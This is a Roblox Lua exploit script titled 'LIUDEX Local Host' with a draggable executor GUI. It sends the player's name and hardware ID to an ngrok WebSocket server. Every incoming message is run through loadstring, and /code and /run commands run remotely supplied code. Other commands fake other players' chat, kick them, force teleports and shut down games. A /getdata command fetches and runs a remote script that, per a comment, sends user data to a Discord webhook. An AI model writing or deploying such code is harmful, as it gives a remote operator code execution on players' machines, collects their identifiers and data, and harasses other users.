-- basic ws
getgenv().signalWs = "wss://xochitl-superexacting-unconcentrically.ngrok-free.dev"
local uri = getgenv().signalWs .. "local_server.js" or readfile("LDXWebSocket.ldx") or  "wss://xochitl-superexacting-unconcentrically.ngrok-free.dev/local_server.js"
local TextChatService = game:GetService("TextChatService")
local que_teleport = que_on_teleport or queonteleport
local selfid = gethwid()
local r,g,b = math.random(50,255),math.random(50,255),math.random(50,255) 
local ws = WebSocket.connect(uri)
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local Teleport = game:GetService("TeleportService")
loadstring(game:HttpGet("https://raw.githubusercontent.com/Asepthegoat/LIUDEX-Z/refs/heads/main/script/tools/functions.lua"))()
ws.OnClose:Connect(function()
	print("Closed")
end)
writefile("LDXWebShocket.ldx",tostring(uri))
ws:Send("/join " .. player.Name .. " " .. selfid)

function depsignalargs(signal)
	local args = string.split(signal," ")
	return args
end
function signalargs(msg) --inQuote by gpt
	local args = {}
	local current = ""
	local inQuote = false

	for i = 1, #msg do
		local char = string.sub(msg, i, i)

		if char == '"' then
			inQuote = not inQuote
		elseif char == " " and not inQuote then
			if current ~= "" then
				table.insert(args, current)
				current = ""
			end
		else
			current = current .. char
		end
	end

	if current ~= "" then
		table.insert(args, current)
	end

	return args
end

function findPlayer(partialName) -- Asep skill isue
    local lowerPartial = string.lower(partialName)
    for _, plr in ipairs(Players:GetPlayers()) do
        -- cek apakah substring ada di nama player
        if string.find(string.lower(plr.Name), lowerPartial, 1, true) then
            return plr
        end
    end
    return nil
end

-- function for command
function bring(targetPlayer, cordinateCFrame)
	if targetPlayer == player or targetPlayer == "@all" then
		print("run bring")
		local char = player.Character
		if char and char:FindFirstChild("HumanoidRootPart") then
			print("if success")
			print(targetPlayer,cordinateCFrame)
			if Players[cordinateCFrame].Name == cordinateCFrame then
				char.HumanoidRootPart.CFrame = Players[cordinateCFrame].Character.HumanoidRootPart.CFrame
			else
				char.HumanoidRootPart.CFrame = cordinateCFrame
			end
		end
	end
end

function fakeChat(target,msg)
    local head = Players[target].Character.Head
    TextChatService:DisplayBubble(head, msg)
    local channel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
    channel:DisplaySystemMessage('<font color="rgb(17, 0, 173)">' .. Players[target].DisplayName .. ": </font>" .. msg)
end

function gameTpPlace(plc)
	Teleport:Teleport(plc,player)
end

-- Code
player.Chatted:Connect(function(message) --send msg and auto complete stuff
	local args = string.split(message," ")
	local msg = args[1]
	
	if string.find(msg,"/bring") then --auto complete stuff
		if args[3] == "" and not args[3] then
			ws:Send(msg .. " " .. player.Name)
		else
			ws:Send(msg)
		end
	elseif string.find(msg,"/game") and args[2] and not args[3] then
		ws:Send(msg .. " " .. game.PlaceId)
	elseif string.find(msg,"/game") and not args[2] and not args[3] then
		ws:Send(msg .. " " .. player.Name .. " " .. game.PlaceId)
	elseif string.find(msg,"/cht") then
		local arguments = table.concat(args," ",2)
		ws:Send(args[1] .. " " .. player.Name .. " " .. arguments)
	elseif string.find(msg,"/server") then
		if args[3] then
			ws:Send("/server" .. " " .. selfid .. " " .. args[2] .. " " .. args[3])
		else
			ws:Send("/server" .. " " .. selfid .. " " .. args[2] .. " " .. args[3])
		end --/server ban someone (but it need owner authority) maybe latter
	elseif string.find(msg,"/announcement") or string.find(msg,"/announce") then
		if args[2] == "server" or args[2] == "session" then
			ws:Send("/announcement" .. " " .. game.JobId .. " " .. args[3])
		else
			ws:Send("/announcement" .. args[2] .. " " .. args[3])
		end --/server ban someone (but it need owner authority) maybe latter

	elseif string.find(msg,"/getserverasset") or string.find(msg,"/getasset") then
		task.spawn(function()
			writefile(args[2],game:HttpGet(getgenv().signalWs .. args[2]))
			repeat task.wait(1) print("downloading") until isfile(args[2])
			print("Complete")
		end)
	elseif string.find(msg,"/giveserverasset") or string.find(msg,"/giveasset") then
		ws:Send(msg .. args[2])
	else
		ws:Send(msg)
	end
end)
-- handler message
ws.OnMessage:Connect(function(message)
	print("Received:", message)
	local f, err = loadstring(message)
	if not f then
		local signal = signalargs(message)
		local cmd = signal[1]:lower()
		local name = player.Name
		-- bring
		if signal[1] == "/bring" then
			if signal[2] == "@all" then
				bring(player,signal[3])
			else
				local target = findPlayer(signal[2])
				bring(target,signal[3])
			end
		-- speed
		elseif signal[1] == "/speed" then
			local target = findPlayer(signal[2])
			if target and target.Character and target.Character:FindFirstChild("Humanoid") then
				target.Character.Humanoid.WalkSpeed = tonumber(signal[3])
			end
		-- game teleport
		elseif signal[1] == "/game" then
			if signal[2] == "@all" and signal[3] ~= nil then
				Teleport:Teleport(signal[3],player)
			elseif findPlayer(signal[2]) == player and signal[3] ~= nil then
				Teleport:Teleport(signal[3],player)
			end
		-- force close
		elseif signal[1] == "/closeall" or signal[1] == "/shutdown" or signal[1] == "/leaveall" then
			game:Shutdown()
		-- join
		elseif signal[1] == "/join" then
			print(findPlayer(signal[2]).Name .. " has join the server")
		-- test
		elseif signal[1] == "/test" then
			print(signal[2])
		-- send data to discord webhook
		elseif signal[1] == "/sendwebhook" or signal[1] == "/userdata" or signal[1] == "/getdata" then
			local target = findPlayer(signal[2])
			if target == player.Name or signal[2] == "all" then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Asepthegoat/LIUDEX-Z/refs/heads/main/script/tools/user-data.lua"))()
			elseif target == player.Name then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Asepthegoat/LIUDEX-Z/refs/heads/main/script/tools/user-data.lua"))()
			end
		-- kick
		elseif signal[1] == "/kick" then
			local target = findPlayer(signal[2])
			local msg = signal[3]
			if signal[4] and signal[4] ~= "" then 
				msg = table.concat(signal, " ", 3)
			end
			if target == player then
				target:Kick(msg) --kick Asepjuragan_fruit "lu tolol bot bgt yapit"
			end
		-- run recived code
		elseif signal[1] == "/code" or signal[1] == "/run" then
			local func, err = loadstring(signal[2])
			if func then
				func()
			else
				warn(err)
			end
		-- Announce
		elseif signal[1] == "/announce" or signal[1] == "announcement" then
			local message = table.concat(signal," ",3)
			local target = findPlayer(signal[2])
			if signal[2] == "global" then
				liudex:Announcement("Announcement",message)
			elseif target == player then
				liudex:Announcement("Announcement",message)
			elseif signal[2] == game.JobId then
				liudex:Announcement("Announcement",message)
			end
		-- chat
		elseif signal[1] == "/cht" then
			local msg = signal[3]
			if signal[4] and signal[4] ~= "" then
				msg = table.concat(signal, " ", 3)
			end
			fakeChat(signal[2],msg)
		-- warn
		else
			warn("error " .. signal[1] .. " is not a ldx command or code or addon command")
		end
	else
		f()
	end
end)

-- serialize CFrame jadi string valid Lua
local cf = player.Character.HumanoidRootPart.CFrame
local cfString = string.format("CFrame.new(%f,%f,%f)", cf.X, cf.Y, cf.Z)

--[[
local testtable = {
	"loadstring%((.-)%)%(%)",
	"require%((.-)%)"
}

local text = 'print("test") loadstring("abc")() require(123)'

local filtered = filterstring(text, testtable)
]]
local cfString = string.format("Vector3.new(%f,%f,%f)", cf.X, cf.Y, cf.Z)

-- the gui
function crgui()
	local uis = game:GetService("UserInputService")
	-- fungsi drag
	local function makeDraggable(frame)
	local dragging = false
	local dragStart = nil
	local startPos = nil

	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	frame.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			frame.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end)
	end

	local function makeDragParent(frame)
	local dragging = false
	local dragStart = nil
	local startPos = nil

	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Parent.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	frame.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			frame.Parent.Position = UDim2.new(
				startPos.X.Scale,
				startPos.X.Offset + delta.X,
				startPos.Y.Scale,
				startPos.Y.Offset + delta.Y
			)
		end
	end)
	end

	local background = Color3.fromRGB(30,0,72)
	local tcolor = Color3.new(1,1,1)
	local newexe = Instance.new("ScreenGui")
	newexe.Parent = gethui()
	newexe.Name = "Lexecutor"

	local function border(parent)
  	local stroke = Instance.new("UIStroke")
  	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
  	stroke.Parent = parent
  	stroke.Color = tcolor
  	return stroke
	end

	local function corner(parent)
  	local corner = Instance.new("UICorner")
  	corner.CornerRadius = UDim.new(0,2)
  	corner.Parent = parent
	end
	local scriptui = Instance.new("Frame")
	scriptui.Size = UDim2.new(0.35,0,0.2,0)
	scriptui.Position = UDim2.new(0.2,0,0.1,0)
	scriptui.BackgroundColor3 = background
	scriptui.Parent = newexe
	corner(scriptui)
	border(scriptui)
	makeDraggable(scriptui)
	local input = Instance.new("TextBox")
	input.Size = UDim2.new(1,-10,1,0)
	input.Position = UDim2.new(0,10,0,0)
	input.Parent = scriptui

	input.TextXAlignment = Enum.TextXAlignment.Left
	input.TextYAlignment = Enum.TextYAlignment.Top
	input.MultiLine = true

	input.TextSize = 10
	input.PlaceholderText = "Script Here"
	input.PlaceholderColor3 = tcolor
	input.Text = "/code print('Lorem Ipsum')"
	input.TextColor3 = tcolor
	input.BackgroundTransparency = 1
	input.BackgroundColor3 = background
	input.TextWrapped = false
	input.ClearTextOnFocus = false
	input.ClipsDescendants = true
	input.TextTruncate = Enum.TextTruncate.None
	input.Font = Enum.Font.Code

	local top = Instance.new("Frame")
	top.Size = UDim2.new(1,0,0,25)
	top.Position = UDim2.new(0,0,0,-25)
	top.BackgroundColor3 = background 
	top.Parent = scriptui

	local close = Instance.new("TextButton")
	close.Size = UDim2.new(0,25,0,25)
	close.Position = UDim2.new(1,-26,0,0)
	close.TextColor3 = tcolor
	close.BackgroundColor3 = background 
	close.Text = "X"
	close.BackgroundTransparency = 1
	close.Parent = top

	local min = Instance.new("TextButton")
	min.Size = UDim2.new(0,25,0,25)
	min.Position = UDim2.new(1,-52,0,0)
	min.TextColor3 = tcolor
	min.BackgroundColor3 = background 
	min.Text = "▼"
	min.Parent = top
	min.BackgroundTransparency = 1
	corner(top)
	border(top)
	makeDragParent(top)
	local title = Instance.new("TextLabel")
	title.Text = "LIUDEX Local Host By Jorell"
	title.Size = UDim2.new(0.5,0,0.5,0)
	title.Position = UDim2.new(0,10,0.3,0)
	title.BackgroundTransparency = 1
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.TextColor3 = Color3.new(1,1,1)
	title.Parent = top
	local areasd

	local logo = Instance.new("ImageButton",newexe)
	logo.Size = UDim2.new(0,48,0,48)
	logo.Position = UDim2.new(0.04,0,0.5,-24)
	logo.Image = "rbxassetid://126569944133822"
	makeDraggable(logo)
	corner(logo)
	border(logo)
	logo.UICorner.CornerRadius = UDim.new(0,10)
	logo.MouseButton1Click:Connect(function()
		scriptui.Visible = not scriptui.Visible
	end)
close.MouseButton1Click:Connect(function()
	newexe:Destroy()
	input.Text = ""
	areasd = nil
end)
local minim = false
min.MouseButton1Click:Connect(function()
	minim = not minim
	if minim then
		min.Text = "◀"
		input.Size = UDim2.new(0,0,0,0)
		scriptui.Size = UDim2.new(0.35,0,0,0)
		run.Visible = false
		run.Active = false
	else
		min.Text = "▼"
		input.Size = UDim2.new(1,-10,1,0)
		scriptui.Size = UDim2.new(0.35,0,0.2,0)
		run.Visible = true
		run.Active = true
	end
end)

input.FocusLost:Connect(function(eP)
	if eP then
	local msg = input.Text
	local args = string.split(msg," ")
	
	if string.find(msg,"/bring") then
		ws:Send(msg .. " " .. player.Name)
	elseif string.find(msg,"/game") and args[2] and not args[3] then
		ws:Send(msg .. " " .. game.PlaceId)
	elseif string.find(msg,"/game") and not args[2] and not args[3] then
		ws:Send(msg .. " " .. player.Name .. " " .. game.PlaceId)
	elseif string.find(msg,"/cht") then
		local arguments = table.concat(args," ",2)
		ws:Send(args[1] .. " " .. player.Name .. " " .. arguments)
	else
		ws:Send(msg)
	end
	end
end)

uis.InputBegan:Connect(function(inpt, gp)
	if gp then
		return
	end
	if uis:IsKeyDown(Enum.KeyCode.LeftControl) and uis:IsKeyDown(Enum.KeyCode.H) then
		newexe.Enabled = not newexe.Enabled
	end
end)
end
crgui()
